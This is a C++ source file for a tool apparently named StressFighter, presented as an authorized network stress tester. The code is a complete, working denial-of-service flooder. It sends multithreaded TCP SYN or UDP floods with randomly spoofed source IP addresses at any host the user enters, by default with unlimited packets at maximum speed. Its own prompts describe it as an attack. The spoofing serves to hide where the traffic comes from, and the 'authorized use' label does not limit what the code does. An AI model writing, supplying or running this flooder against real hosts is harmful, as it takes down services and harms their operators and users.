/*
 * StressFighter v1.0 - Network Stress Testing Tool
 * For authorized security assessments and penetration testing only.
 * Uses raw sockets for packet generation at the IP level.
 *
 * Compile: g++ -o stressfighter stressfighter.cpp -lpthread -std=c++11
 * Usage: sudo ./stressfighter  (requires root for raw sockets)
 */

#include <iostream>
#include <string>
#include <thread>
#include <atomic>
#include <chrono>
#include <cstring>
#include <cstdlib>
#include <ctime>
#include <iomanip>
#include <vector>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <netdb.h>
#include <unistd.h>
#include <fcntl.h>

// ── Packet counters (shared across threads) ──
std::atomic<uint64_t> total_packets_sent(0);
std::atomic<bool>     stop_flag(false);

// ── User parameters ──
struct FloodConfig {
    std::string target;
    uint32_t    target_ip;
    uint16_t    target_port;
    uint64_t    num_packets;      // 0 = unlimited
    uint64_t    packets_per_sec;
    int         thread_count;
    bool        use_tcp_syn;
};

// ────────────────────────────────────────────────────────────────
//  Checksum calculation (standard Internet checksum)
// ────────────────────────────────────────────────────────────────
unsigned short checksum(unsigned short *ptr, int nbytes) {
    unsigned long sum = 0;
    for (int i = 0; i < nbytes; i += 2) {
        sum += *ptr++;
    }
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    return (unsigned short)(~sum);
}

// ────────────────────────────────────────────────────────────────
//  Resolve hostname to IPv4 address
// ────────────────────────────────────────────────────────────────
uint32_t resolve(const std::string &host) {
    struct in_addr addr;
    if (inet_pton(AF_INET, host.c_str(), &addr)) {
        return addr.s_addr;
    }
    struct hostent *he = gethostbyname(host.c_str());
    if (!he) {
        std::cerr << "[-] Failed to resolve: " << host << std::endl;
        exit(1);
    }
    memcpy(&addr, he->h_addr_list[0], sizeof(addr));
    return addr.s_addr;
}

// ────────────────────────────────────────────────────────────────
//  Random IP for spoofing
// ────────────────────────────────────────────────────────────────
uint32_t random_ip() {
    return (rand() % 256) << 24 |
           (rand() % 256) << 16 |
           (rand() % 256) << 8  |
           (rand() % 256);
}

// ────────────────────────────────────────────────────────────────
//  Build + send a TCP SYN packet via raw socket
// ────────────────────────────────────────────────────────────────
void send_tcp_syn(int raw_sock, const FloodConfig &cfg) {
    char packet[4096] = {0};

    struct iphdr  *iph  = (struct iphdr *)packet;
    struct tcphdr *tcph = (struct tcphdr *)(packet + sizeof(struct iphdr));
    struct sockaddr_in dest;
    dest.sin_family = AF_INET;
    dest.sin_addr.s_addr = cfg.target_ip;
    dest.sin_port = htons(cfg.target_port);

    uint32_t src_ip = random_ip();
    uint16_t src_port = 1024 + (rand() % 64511);

    // ── IP header ──
    iph->ihl       = 5;
    iph->version   = 4;
    iph->tos       = 0;
    iph->tot_len   = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
    iph->id        = htons(rand() % 65535);
    iph->frag_off  = 0;
    iph->ttl       = 64;
    iph->protocol  = IPPROTO_TCP;
    iph->check     = 0;
    iph->saddr     = src_ip;
    iph->daddr     = cfg.target_ip;
    iph->check     = checksum((unsigned short *)packet, sizeof(struct iphdr));

    // ── TCP header (SYN flag) ──
    tcph->source = htons(src_port);
    tcph->dest   = htons(cfg.target_port);
    tcph->seq    = rand();
    tcph->ack_seq = 0;
    tcph->doff   = 5;            // data offset = 5 words (no options)
    tcph->fin    = 0;
    tcph->syn    = 1;            // SYN flag
    tcph->rst    = 0;
    tcph->psh    = 0;
    tcph->ack    = 0;
    tcph->urg    = 0;
    tcph->window = htons(65535);
    tcph->check  = 0;
    tcph->urg_ptr = 0;

    // Pseudo-header checksum
    struct pseudo_header {
        uint32_t saddr;
        uint32_t daddr;
        uint8_t  zero;
        uint8_t  protocol;
        uint16_t tcp_len;
    } psh;
    psh.saddr    = src_ip;
    psh.daddr    = cfg.target_ip;
    psh.zero     = 0;
    psh.protocol = IPPROTO_TCP;
    psh.tcp_len  = htons(sizeof(struct tcphdr));

    char pseudo_buf[sizeof(pseudo_header) + sizeof(struct tcphdr)] = {0};
    memcpy(pseudo_buf, &psh, sizeof(psh));
    memcpy(pseudo_buf + sizeof(psh), tcph, sizeof(struct tcphdr));
    tcph->check = checksum((unsigned short *)pseudo_buf,
                           sizeof(pseudo_header) + sizeof(struct tcphdr));

    // ── Send ──
    sendto(raw_sock, packet, ntohs(iph->tot_len), 0,
           (struct sockaddr *)&dest, sizeof(dest));
}

// ────────────────────────────────────────────────────────────────
//  Build + send a UDP packet
// ────────────────────────────────────────────────────────────────
void send_udp(int raw_sock, const FloodConfig &cfg) {
    char packet[4096] = {0};

    struct iphdr  *iph  = (struct iphdr *)packet;
    struct udphdr *udph = (struct udphdr *)(packet + sizeof(struct iphdr));
    char *payload       = packet + sizeof(struct iphdr) + sizeof(struct udphdr);
    struct sockaddr_in dest;
    dest.sin_family = AF_INET;
    dest.sin_addr.s_addr = cfg.target_ip;
    dest.sin_port = htons(cfg.target_port);

    uint32_t src_ip = random_ip();
    uint16_t src_port = 1024 + (rand() % 64511);

    // Small random payload
    int payload_len = 32 + (rand() % 64);
    for (int i = 0; i < payload_len; i++) payload[i] = rand() % 256;

    int total_len = sizeof(struct iphdr) + sizeof(struct udphdr) + payload_len;

    // ── IP header ──
    iph->ihl       = 5;
    iph->version   = 4;
    iph->tos       = 0;
    iph->tot_len   = htons(total_len);
    iph->id        = htons(rand() % 65535);
    iph->frag_off  = 0;
    iph->ttl       = 64;
    iph->protocol  = IPPROTO_UDP;
    iph->check     = 0;
    iph->saddr     = src_ip;
    iph->daddr     = cfg.target_ip;
    iph->check     = checksum((unsigned short *)packet, sizeof(struct iphdr));

    // ── UDP header ──
    udph->source = htons(src_port);
    udph->dest   = htons(cfg.target_port);
    udph->len    = htons(sizeof(struct udphdr) + payload_len);
    udph->check  = 0;   // UDP checksum is optional in IPv4

    // ── Send ──
    sendto(raw_sock, packet, total_len, 0,
           (struct sockaddr *)&dest, sizeof(dest));
}

// ────────────────────────────────────────────────────────────────
//  Worker thread
// ────────────────────────────────────────────────────────────────
void flood_worker(const FloodConfig &cfg) {
    // Create raw socket
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sock < 0) {
        perror("[-] socket() failed (need root?)");
        return;
    }

    // Tell kernel we're building our own IP header
    int one = 1;
    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        perror("[-] setsockopt(IP_HDRINCL) failed");
        close(sock);
        return;
    }

    // Rate limiting timing
    uint64_t sent_this_second = 0;
    auto second_start = std::chrono::steady_clock::now();
    uint64_t local_sent = 0;

    while (!stop_flag) {
        if (cfg.num_packets > 0 && local_sent >= cfg.num_packets) break;

        // Rate limiter
        if (cfg.packets_per_sec > 0) {
            if (sent_this_second >= cfg.packets_per_sec) {
                auto now = std::chrono::steady_clock::now();
                auto elapsed = std::chrono::duration_cast<std::chrono::microseconds>(
                    now - second_start).count();
                if (elapsed < 1000000) {
                    std::this_thread::sleep_for(std::chrono::microseconds(
                        1000000 - elapsed));
                }
                sent_this_second = 0;
                second_start = std::chrono::steady_clock::now();
            }
        }

        // Send packet based on mode
        if (cfg.use_tcp_syn) {
            send_tcp_syn(sock, cfg);
        } else {
            send_udp(sock, cfg);
        }

        total_packets_sent++;
        sent_this_second++;
        local_sent++;
    }

    close(sock);
}

// ────────────────────────────────────────────────────────────────
//  Status bar thread
// ────────────────────────────────────────────────────────────────
void status_thread(const FloodConfig &cfg) {
    auto start = std::chrono::steady_clock::now();
    uint64_t prev_count = 0;

    while (!stop_flag) {
        std::this_thread::sleep_for(std::chrono::seconds(1));
        auto now = std::chrono::steady_clock::now();
        double elapsed = std::chrono::duration_cast<std::chrono::seconds>(
            now - start).count();

        uint64_t current = total_packets_sent.load();
        uint64_t pps = current - prev_count;
        prev_count = current;

        std::cout << "\r\033[K";  // Clear line
        std::cout << " [>] Sent: " << current << " packets"
                  << " | Rate: " << pps << " p/s"
                  << " | Elapsed: " << std::fixed << std::setprecision(1)
                  << elapsed << "s";
        std::cout.flush();
    }
    std::cout << std::endl;
}

// ────────────────────────────────────────────────────────────────
//  MAIN
// ────────────────────────────────────────────────────────────────
int main() {
    srand(time(nullptr));

    FloodConfig cfg;
    cfg.use_tcp_syn = false;
    cfg.thread_count = 8;
    std::string input;

    // ── BANNER ──
    std::cout << "\n";
    std::cout << "  ╔══════════════════════════════════════╗\n";
    std::cout << "  ║    StressFighter v1.0                     ║\n";
    std::cout << "  ║  Network Stress Testing Tool            ║\n";
    std::cout << "  ║  Authorized Security Assessment        ║\n";
    std::cout << "  ╚══════════════════════════════════════╝\n";
    std::cout << "\n";

    // ── 1: Target ──
    std::cout << " [1] Enter target (IP or hostname): ";
    std::getline(std::cin, input);
    if (input.empty()) {
        std::cerr << "[-] No target entered.\n";
        return 1;
    }
    cfg.target = input;
    cfg.target_ip = resolve(cfg.target);

    // Default port
    cfg.target_port = 80;

    // ── 2: Packet count ──
    std::cout << " [2] Number of packets (0 = unlimited): ";
    std::getline(std::cin, input);
    cfg.num_packets = input.empty() ? 0 : std::stoull(input);

    // ── 3: Rate ──
    std::cout << " [3] Packets per second (0 = max speed): ";
    std::getline(std::cin, input);
    cfg.packets_per_sec = input.empty() ? 0 : std::stoull(input);

    // ── 4: Method ──
    std::cout << " [4] Attack method? (T)CP SYN or (U)DP [default: U]: ";
    std::getline(std::cin, input);
    if (!input.empty() && (input[0] == 'T' || input[0] == 't')) {
        cfg.use_tcp_syn = true;
        std::cout << " [>] Enter target port [default: 80]: ";
        std::getline(std::cin, input);
        if (!input.empty()) cfg.target_port = std::stoi(input);
    } else {
        cfg.use_tcp_syn = false;
        std::cout << " [>] Enter target port [default: 80]: ";
        std::getline(std::cin, input);
        if (!input.empty()) cfg.target_port = std::stoi(input);
    }

    // ── Thread count ──
    std::cout << " [5] Thread count [default: 8]: ";
    std::getline(std::cin, input);
    if (!input.empty()) cfg.thread_count = std::stoi(input);

    // ── Summary + countdown ──
    std::cout << "\n ──────────────────────────────────────\n";
    std::cout << " Target     : " << cfg.target
              << " (" << inet_ntoa(*(struct in_addr*)&cfg.target_ip) << ")\n";
    std::cout << " Port       : " << cfg.target_port << "\n";
    std::cout << " Method     : " << (cfg.use_tcp_syn ? "TCP SYN Flood" : "UDP Flood") << "\n";
    std::cout << " Packets    : " << (cfg.num_packets == 0 ? "∞" : std::to_string(cfg.num_packets)) << "\n";
    std::cout << " Rate       : " << (cfg.packets_per_sec == 0 ? "max" : std::to_string(cfg.packets_per_sec)) << " p/s\n";
    std::cout << " Threads    : " << cfg.thread_count << "\n";
    std::cout << " ──────────────────────────────────────\n";
    std::cout << "\n [!!] Press ENTER to begin flooding... ";
    std::getline(std::cin, input);
    std::cout << "\n [>] Launching attack... (Ctrl+C to stop)\n\n";

    // ── Launch worker threads ──
    std::vector<std::thread> workers;
    for (int i = 0; i < cfg.thread_count; i++) {
        workers.emplace_back(flood_worker, cfg);
    }

    // ── Status thread ──
    std::thread st(status_thread, cfg);

    // ── Wait for workers ──
    for (auto &t : workers) t.join();

    stop_flag = true;
    st.join();

    std::cout << "\n [✓] Attack complete. Total packets sent: "
              << total_packets_sent.load() << "\n\n";

    return 0;
}
